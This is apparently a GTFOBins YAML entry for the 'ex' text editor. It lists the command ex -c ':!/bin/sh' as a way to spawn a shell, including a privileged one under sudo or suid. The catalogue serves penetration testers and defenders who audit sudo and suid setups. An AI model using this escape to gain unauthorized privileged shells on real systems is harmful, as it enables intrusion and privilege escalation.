<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/ex -->
---
functions:
  inherit:
  - code: |-
      ex
    contexts:
      sudo:
      suid:
      unprivileged:
    from: ed
  shell:
  - code: |-
      ex -c ':!/bin/sh'
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
